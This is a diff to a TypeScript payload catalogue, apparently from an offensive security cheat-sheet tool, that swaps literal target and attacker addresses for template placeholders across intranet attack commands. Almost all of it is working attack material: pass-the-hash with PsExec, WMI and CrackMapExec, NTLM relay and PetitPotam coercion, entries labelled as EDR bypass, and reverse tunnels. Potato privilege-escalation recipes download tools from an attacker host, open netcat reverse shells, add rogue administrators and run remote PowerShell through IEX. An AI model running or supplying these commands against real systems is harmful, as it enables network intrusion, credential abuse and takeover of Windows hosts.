@@ -406,7 +406,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: 'traceroute',
-        command: 'tracert target_ip',
+        command: 'tracert {TARGET_IP}',
         description: { zh: '追踪路由', en: 'Traceroute' },
         platform: 'windows'
       }
@@ -438,13 +438,13 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '查看远程共享', en: 'View remote shares' },
-        command: 'net view \\\\target_ip',
+        command: 'net view \\\\{TARGET_IP}',
         description: { zh: '查看远程机器共享', en: 'View remote machine shares' },
         platform: 'windows'
       },
       {
         title: { zh: 'SMBMap枚举', en: 'SMBMapEnumeration' },
-        command: 'smbmap -H target_ip -u user -p password',
+        command: 'smbmap -H {TARGET_IP} -u user -p password',
         description: { zh: '使用SMBMap枚举共享', en: 'UseSMBMapEnumerationShares' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -454,7 +454,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: 'CrackMapExec枚举', en: 'CrackMapExecEnumeration' },
-        command: 'crackmapexec smb target_ip -u user -p password --shares',
+        command: 'crackmapexec smb {TARGET_IP} -u user -p password --shares',
         description: { zh: '使用CME枚举共享', en: 'UseCMEEnumerationShares' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -464,7 +464,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: 'smbclient枚举', en: 'smbclientEnumeration' },
-        command: 'smbclient -L target_ip -U user%password',
+        command: 'smbclient -L {TARGET_IP} -U user%password',
         description: { zh: '使用smbclient枚举', en: 'UsesmbclientEnumeration' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -1282,7 +1282,7 @@ export const intranetPayloads: PayloadItem[] = [
     execution: [
       {
         title: { zh: '基本使用', en: 'basicUse' },
-        command: 'psexec.py domain/user:password@target_ip',
+        command: 'psexec.py domain/user:password@{TARGET_IP}',
         description: { zh: '使用Impacket的psexec.py连接目标', en: 'UseImpacket psexec.pyConnectionTarget' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -1293,7 +1293,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '使用哈希连接', en: 'Using HashConnection' },
-        command: 'psexec.py -hashes :NTLM_HASH domain/user@target_ip',
+        command: 'psexec.py -hashes :NTLM_HASH domain/user@{TARGET_IP}',
         description: { zh: '使用NTLM哈希进行Pass-the-Hash', en: 'UseNTLMhash perform Pass-the-Hash' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -1303,13 +1303,13 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '执行命令', en: 'Execute Command' },
-        command: 'psexec.py domain/user:password@target_ip "whoami"',
+        command: 'psexec.py domain/user:password@{TARGET_IP} "whoami"',
         description: { zh: '在目标机器执行命令', en: 'in TargetMachineExecute Command' },
         platform: 'linux'
       },
       {
         title: 'Windows PsExec',
-        command: 'PsExec.exe \\\\target_ip -u domain\\user -p password cmd.exe',
+        command: 'PsExec.exe \\\\{TARGET_IP} -u domain\\user -p password cmd.exe',
         description: { zh: '使用Sysinternals PsExec', en: 'UseSysinternals PsExec' },
         platform: 'windows',
         syntaxBreakdown: [
@@ -1322,12 +1322,12 @@ export const intranetPayloads: PayloadItem[] = [
     edrBypass: [
       {
         title: { zh: '自定义服务名', en: 'CustomServicename' },
-        command: 'psexec.py -service-name CustomService domain/user:password@target_ip',
+        command: 'psexec.py -service-name CustomService domain/user:password@{TARGET_IP}',
         description: { zh: '使用自定义服务名避免检测', en: 'Use a custom service name to avoid detection' }
       },
       {
         title: { zh: 'SMBExec替代', en: 'SMBExecAlternative' },
-        command: 'smbexec.py domain/user:password@target_ip',
+        command: 'smbexec.py domain/user:password@{TARGET_IP}',
         description: { zh: '使用smbexec.py，不写入磁盘', en: 'Usesmbexec.py, not WriteDisk' }
       }
     ],
@@ -1352,7 +1352,7 @@ export const intranetPayloads: PayloadItem[] = [
     execution: [
       {
         title: { zh: 'WMI执行命令', en: 'WMIExecute Command' },
-        command: 'wmic /node:target_ip /user:domain\\user /password:pass process call create "cmd.exe /c whoami"',
+        command: 'wmic /node:{TARGET_IP} /user:domain\\user /password:pass process call create "cmd.exe /c whoami"',
         description: { zh: '使用WMIC远程执行命令', en: 'UseWMICRemoteExecute Command' },
         platform: 'windows',
         syntaxBreakdown: [
@@ -1364,7 +1364,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: 'Impacket wmiexec',
-        command: 'wmiexec.py domain/user:password@target_ip',
+        command: 'wmiexec.py domain/user:password@{TARGET_IP}',
         description: { zh: '使用Impacket的wmiexec.py', en: 'UseImpacket wmiexec.py' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -1373,13 +1373,13 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '使用哈希', en: 'Using Hash' },
-        command: 'wmiexec.py -hashes :NTLM_HASH domain/user@target_ip',
+        command: 'wmiexec.py -hashes :NTLM_HASH domain/user@{TARGET_IP}',
         description: { zh: 'Pass-the-Hash通过WMI', en: 'Pass-the-HashthroughWMI' },
         platform: 'linux'
       },
       {
         title: 'PowerShell WMI',
-        command: 'Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName target_ip -Credential $cred',
+        command: 'Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName {TARGET_IP} -Credential $cred',
         description: { zh: '使用PowerShell WMI', en: 'UsePowerShell WMI' },
         platform: 'windows',
         syntaxBreakdown: [
@@ -1392,7 +1392,7 @@ export const intranetPayloads: PayloadItem[] = [
     edrBypass: [
       {
         title: { zh: 'WMI事件订阅', en: 'WMI event subscription' },
-        command: 'wmic /node:target_ip /user:domain\\user /password:pass path win32_product call install /package:"\\\\attacker\\share\\malware.msi"',
+        command: 'wmic /node:{TARGET_IP} /user:domain\\user /password:pass path win32_product call install /package:"\\\\attacker\\share\\malware.msi"',
         description: { zh: '通过WMI安装MSI包执行代码', en: 'throughWMIInstallationMSIPackageExecuteCode' }
       }
     ],
@@ -1417,7 +1417,7 @@ export const intranetPayloads: PayloadItem[] = [
     execution: [
       {
         title: 'Impacket PtH',
-        command: 'psexec.py -hashes :NTHASH domain/user@target_ip',
+        command: 'psexec.py -hashes :NTHASH domain/user@{TARGET_IP}',
         description: { zh: '使用Impacket进行PtH', en: 'UseImpacket perform PtH' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -1427,7 +1427,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: 'CrackMapExec PtH',
-        command: 'crackmapexec smb target_ip -u user -H NTHASH -d domain',
+        command: 'crackmapexec smb {TARGET_IP} -u user -H NTHASH -d domain',
         description: { zh: '使用CrackMapExec进行PtH', en: 'UseCrackMapExec perform PtH' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -1444,7 +1444,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: 'PowerShell PtH',
-        command: 'Invoke-SMBClient -Domain domain -User user -Hash NTHASH -Target target_ip',
+        command: 'Invoke-SMBClient -Domain domain -User user -Hash NTHASH -Target {TARGET_IP}',
         description: { zh: '使用PowerShell进行PtH', en: 'UsePowerShell perform PtH' },
         platform: 'windows'
       }
@@ -1505,7 +1505,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: 'IPv6中继', en: 'IPv6Relay' },
-        command: 'mitm6 -d domain.com & ntlmrelayx.py -t ldap://dc_ip -wh attacker_ip',
+        command: 'mitm6 -d domain.com & ntlmrelayx.py -t ldap://dc_ip -wh {ATTACKER_IP}',
         description: { zh: '使用IPv6进行NTLM中继', en: 'UseIPv6 perform NTLMRelay' },
         platform: 'linux'
       }
@@ -1580,7 +1580,7 @@ export const intranetPayloads: PayloadItem[] = [
     edrBypass: [
       {
         title: 'RoguePotato',
-        command: 'RoguePotato.exe -r attacker_ip -l 9999 -e "cmd.exe"',
+        command: 'RoguePotato.exe -r {ATTACKER_IP} -l 9999 -e "cmd.exe"',
         description: { zh: 'RoguePotato，绕过更多限制', en: 'RoguePotato — bypasses additional restrictions' }
       }
     ],
@@ -1673,7 +1673,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '客户端配置', en: 'ClientConfiguration' },
-        command: '[common]\nserver_addr = attacker_ip\nserver_port = 7000\n\n[rdp]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 3389\nremote_port = 3389',
+        command: '[common]\nserver_addr = {ATTACKER_IP}\nserver_port = 7000\n\n[rdp]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 3389\nremote_port = 3389',
         description: { zh: 'FRP客户端配置文件frpc.ini', en: 'FRPClientConfiguration Filefrpc.ini' },
         platform: 'windows',
         syntaxBreakdown: [
@@ -1727,13 +1727,13 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '反向SOCKS', en: 'Reverse SOCKS' },
-        command: 'chisel.exe client attacker_ip:8000 R:socks',
+        command: 'chisel.exe client {ATTACKER_IP}:8000 R:socks',
         description: { zh: '建立反向SOCKS代理', en: 'EstablishReverse SOCKS Proxy' },
         platform: 'windows'
       },
       {
         title: { zh: '端口转发', en: 'Port Forwarding' },
-        command: 'chisel.exe client attacker_ip:8000 R:3389:127.0.0.1:3389',
+        command: 'chisel.exe client {ATTACKER_IP}:8000 R:3389:127.0.0.1:3389',
         description: { zh: '端口转发', en: 'Port Forwarding' },
         platform: 'windows'
       }
@@ -3839,7 +3839,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: 'PetitPotam组合', en: 'PetitPotamGroupsCombine' },
-        command: 'python petitpotam.py -d domain -u user -p pass attacker_ip target_ip\n结合NTLM中继攻击ADCS',
+        command: 'python petitpotam.py -d domain -u user -p pass {ATTACKER_IP} {TARGET_IP}\n结合NTLM中继攻击ADCS',
         description: 'PetitPotam + RDP Relay',
         platform: 'linux'
       }
@@ -4176,7 +4176,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '反向代理', en: 'Reverse Proxy' },
-        command: '攻击机: ./ew -s rcsocks -l 1080 -e 8888\n跳板机: ./ew -s rssocks -d attacker_ip -e 8888',
+        command: '攻击机: ./ew -s rcsocks -l 1080 -e 8888\n跳板机: ./ew -s rssocks -d {ATTACKER_IP} -e 8888',
         description: { zh: '反向SOCKS代理', en: 'Reverse SOCKS Proxy' },
         platform: 'linux'
       },
@@ -4212,7 +4212,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '连接客户端', en: 'ConnectionClient' },
-        command: './venom_client -rhost attacker_ip -rport 9999\n在跳板机连接服务端',
+        command: './venom_client -rhost {ATTACKER_IP} -rport 9999\n在跳板机连接服务端',
         description: { zh: '连接服务端', en: 'ConnectionServer-Side' },
         platform: 'all',
         syntaxBreakdown: [
@@ -4344,7 +4344,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '触发认证', en: 'TriggerAuthentication' },
-        command: 'python petitpotam.py -d domain -u user -p pass attacker_ip DC_IP\n强制DC向攻击者认证',
+        command: 'python petitpotam.py -d domain -u user -p pass {ATTACKER_IP} DC_IP\n强制DC向攻击者认证',
         description: { zh: '触发认证', en: 'TriggerAuthentication' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -5846,7 +5846,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: 'JuicyPotato (Windows Server 2016/2019)',
-        command: '# 下载JuicyPotato\ncertutil -urlcache -split -f http://attacker/JuicyPotato.exe C:\\temp\\jp.exe\n\n# 使用JuicyPotato提权执行命令\nC:\\temp\\jp.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c whoami > C:\\temp\\proof.txt" -t *\n\n# 使用特定CLSID (不同系统需要不同CLSID)\nC:\\temp\\jp.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c net user testadmin Test@123 /add && net localgroup administrators testadmin /add" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}\n\n# 反弹Shell\nC:\\temp\\jp.exe -l 1337 -p C:\\temp\\nc.exe -a "-e cmd.exe attacker_ip 4444" -t *',
+        command: '# 下载JuicyPotato\ncertutil -urlcache -split -f http://attacker/JuicyPotato.exe C:\\temp\\jp.exe\n\n# 使用JuicyPotato提权执行命令\nC:\\temp\\jp.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c whoami > C:\\temp\\proof.txt" -t *\n\n# 使用特定CLSID (不同系统需要不同CLSID)\nC:\\temp\\jp.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c net user testadmin Test@123 /add && net localgroup administrators testadmin /add" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}\n\n# 反弹Shell\nC:\\temp\\jp.exe -l 1337 -p C:\\temp\\nc.exe -a "-e cmd.exe {ATTACKER_IP} 4444" -t *',
         description: { zh: 'JuicyPotato利用COM服务器和NTLM认证实现令牌模拟。通过创建本地COM服务器，欺骗SYSTEM账户向其认证，然后模拟该令牌执行命令', en: 'JuicyPotato exploits COM servers and NTLM authentication for token impersonation. It creates a local COM server, tricks the SYSTEM account into authenticating to it, then impersonates that token to execute commands' },
         platform: 'windows',
         syntaxBreakdown: [
@@ -5859,7 +5859,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: 'PrintSpoofer (Windows 10/Server 2019+)',
-        command: '# PrintSpoofer - 利用打印服务命名管道\nPrintSpoofer.exe -i -c cmd\n\n# 直接执行命令\nPrintSpoofer.exe -c "cmd /c whoami > C:\\temp\\proof.txt"\n\n# 反弹Shell\nPrintSpoofer.exe -c "C:\\temp\\nc.exe attacker_ip 4444 -e cmd.exe"\n\n# 以SYSTEM身份启动PowerShell\nPrintSpoofer.exe -i -c powershell.exe',
+        command: '# PrintSpoofer - 利用打印服务命名管道\nPrintSpoofer.exe -i -c cmd\n\n# 直接执行命令\nPrintSpoofer.exe -c "cmd /c whoami > C:\\temp\\proof.txt"\n\n# 反弹Shell\nPrintSpoofer.exe -c "C:\\temp\\nc.exe {ATTACKER_IP} 4444 -e cmd.exe"\n\n# 以SYSTEM身份启动PowerShell\nPrintSpoofer.exe -i -c powershell.exe',
         description: { zh: 'PrintSpoofer利用Windows打印服务的命名管道模拟功能。它创建一个命名管道并欺骗Print Spooler服务连接，从而获取SYSTEM令牌。适用于JuicyPotato无法使用的新版Windows', en: 'PrintSpoofer exploits the Windows Print Spooler named pipe impersonation feature. It creates a named pipe and tricks the Print Spooler service into connecting, obtaining a SYSTEM token. Suitable for newer Windows versions where JuicyPotato does not work' },
         platform: 'windows',
         syntaxBreakdown: [
@@ -5879,7 +5879,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: 'GodPotato (全版本通杀)', en: 'GodPotato (Universal Version Support)' },
-        command: '# GodPotato - 适用于Windows Server 2012-2022所有版本\nGodPotato.exe -cmd "cmd /c whoami"\n\n# 执行反弹Shell\nGodPotato.exe -cmd "cmd /c C:\\temp\\nc.exe -e cmd.exe attacker_ip 4444"\n\n# 添加管理员\nGodPotato.exe -cmd "net user testadmin Test@123 /add && net localgroup administrators testadmin /add"\n\n# 执行PowerShell\nGodPotato.exe -cmd "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(\'http://attacker/shell.ps1\')"',
+        command: '# GodPotato - 适用于Windows Server 2012-2022所有版本\nGodPotato.exe -cmd "cmd /c whoami"\n\n# 执行反弹Shell\nGodPotato.exe -cmd "cmd /c C:\\temp\\nc.exe -e cmd.exe {ATTACKER_IP} 4444"\n\n# 添加管理员\nGodPotato.exe -cmd "net user testadmin Test@123 /add && net localgroup administrators testadmin /add"\n\n# 执行PowerShell\nGodPotato.exe -cmd "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(\'http://attacker/shell.ps1\')"',
         description: { zh: 'GodPotato利用DCOM OXID解析器的漏洞，无需指定CLSID，兼容几乎所有Windows版本。是目前最通用的Potato变种', en: 'GodPotato exploits a DCOM OXID resolver vulnerability, requires no CLSID specification, and is compatible with nearly all Windows versions. It is currently the most universal Potato variant' },
         platform: 'windows',
         syntaxBreakdown: [
@@ -5889,7 +5889,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: 'RoguePotato (远程场景)', en: 'RoguePotato (RemoteScenario)' },
-        command: '# 攻击机 - 启动socat重定向\nsocat tcp-listen:135,reuseaddr,fork tcp:target_ip:9999\n\n# 目标机 - 执行RoguePotato\nRoguePotato.exe -r attacker_ip -e "cmd /c whoami > C:\\temp\\proof.txt" -l 9999\n\n# 或使用netcat反弹\nRoguePotato.exe -r attacker_ip -e "C:\\temp\\nc.exe attacker_ip 4444 -e cmd.exe" -l 9999',
+        command: '# 攻击机 - 启动socat重定向\nsocat tcp-listen:135,reuseaddr,fork tcp:{TARGET_IP}:9999\n\n# 目标机 - 执行RoguePotato\nRoguePotato.exe -r {ATTACKER_IP} -e "cmd /c whoami > C:\\temp\\proof.txt" -l 9999\n\n# 或使用netcat反弹\nRoguePotato.exe -r {ATTACKER_IP} -e "C:\\temp\\nc.exe {ATTACKER_IP} 4444 -e cmd.exe" -l 9999',
         description: { zh: 'RoguePotato是JuicyPotato的改进版，通过远程OXID解析器实现NTLM认证中继。需要一台攻击机辅助完成中继', en: 'RoguePotato is an improved version of JuicyPotato that uses a remote OXID resolver for NTLM authentication relay. Requires an attack machine to assist with the relay' },
         platform: 'windows',
         syntaxBreakdown: [
